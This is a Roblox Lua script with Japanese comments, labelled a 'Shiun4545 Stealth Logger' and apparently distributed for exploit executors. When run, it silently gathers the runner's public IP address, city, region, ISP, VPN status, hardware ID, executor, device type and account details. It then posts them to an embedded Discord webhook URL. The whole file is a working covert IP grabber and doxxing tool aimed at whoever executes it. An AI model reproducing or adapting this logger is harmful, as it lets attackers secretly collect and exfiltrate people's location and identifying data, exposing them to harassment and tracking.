local MarketplaceService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local GuiService = game:GetService("GuiService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

-- Webhook URL
local url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"

local function sendDetailedLog()
    local ipData = "取得失敗"
    local geoData = {regionName = "不明", city = "不明", isp = "不明", proxy = false}
    local info = {Name = "不明"}
    local avatarUrl = ""

    -- プロフィールとゲームのURL生成
    local profileUrl = "https://www.roblox.com/users/" .. lp.UserId .. "/profile"
    local gameUrl = "https://www.roblox.com/games/" .. game.PlaceId

    -- アバター画像の取得
    pcall(function()
        local thumbApi = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. lp.UserId .. "&size=720x720&format=Png&isCircular=false"
        local thumbRes = game:HttpGet(thumbApi)
        local thumbData = HttpService:JSONDecode(thumbRes)
        if thumbData and thumbData.data and thumbData.data[1] then
            avatarUrl = thumbData.data[1].imageUrl
        else
            avatarUrl = "https://www.roblox.com/avatar-thumbnail/image?userId=" .. lp.UserId .. "&width=420&height=420&format=png"
        end
    end)

    -- IPおよび位置情報の取得
    pcall(function()
        info = MarketplaceService:GetProductInfo(game.PlaceId)
        ipData = game:HttpGet("https://api.ipify.org")
        local response = game:HttpGet("http://ip-api.com/json/" .. ipData .. "?lang=ja&fields=status,message,country,regionName,city,isp,proxy")
        geoData = HttpService:JSONDecode(response)
    end)

    -- 実行環境の特定
    local executor = (identifyexecutor and identifyexecutor()) or "不明なExecutor"
    local hwid = (gethwid and gethwid()) or "取得不可"
    
    local deviceDetail = "不明"
    if GuiService:IsTenFootInterface() then
        deviceDetail = "🎮 Console (Xbox/PS)"
    elseif UserInputService.TouchEnabled then
        local screenSize = workspace.CurrentCamera.ViewportSize
        if math.min(screenSize.X, screenSize.Y) < 600 then
            deviceDetail = "📱 Mobile (Phone)"
        else
            deviceDetail = "平板 Tablet"
        end
    elseif UserInputService.KeyboardEnabled then
        deviceDetail = "💻 PC (Windows/Mac)"
    end

    -- Discord用のデータ構造作成
    local data = {
        ["embeds"] = {{
            ["title"] = "🚨 実行者特定ログ: " .. lp.Name,
            ["color"] = 0xff4500,
            ["fields"] = {
                {
                    ["name"] = "👤 ユーザー情報",
                    ["value"] = "**Name:** `" .. lp.Name .. "`\n**ID:** [" .. lp.UserId .. "](" .. profileUrl .. ")\n**垢経過:** " .. lp.AccountAge .. "日\n🔗 **[プロフィールを開く](" .. profileUrl .. ")**",
                    ["inline"] = true
                },
                {
                    ["name"] = "🛠 実行環境",
                    ["value"] = "**Device:** " .. deviceDetail .. "\n**Executor:** `" .. executor .. "`\n**HWID:** `" .. hwid .. "`",
                    ["inline"] = true
                },
                {
                    ["name"] = "🌐 ネットワーク",
                    ["value"] = "**IP:** `" .. ipData .. "`\n**地域:** " .. geoData.regionName .. " " .. geoData.city .. "\n**ISP:** " .. geoData.isp .. "\n**VPN/Proxy:** " .. (geoData.proxy and "🚩 検出" or "✅ 無し"),
                    ["inline"] = false
                },
                {
                    ["name"] = "📍 サーバー/実行場所",
                    ["value"] = "**Game:** [" .. info.Name .. "](" .. gameUrl .. ")\n**PlaceId:** `" .. game.PlaceId .. "`\n**JobId:** `" .. game.JobId .. "`",
                    ["inline"] = false
                }
            },
            ["thumbnail"] = {
                ["url"] = avatarUrl
            },
            ["footer"] = {
                ["text"] = "Shiun4545 Stealth Logger | " .. os.date("%Y/%m/%d %X")
            }
        }}
    }

    -- 送信処理
    pcall(function()
        local req = (syn and syn.request) or (http and http.request) or request
        if req then
            req({
                Url = url,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(data)
            })
        end
    end)
end

-- 実行
sendDetailedLog()
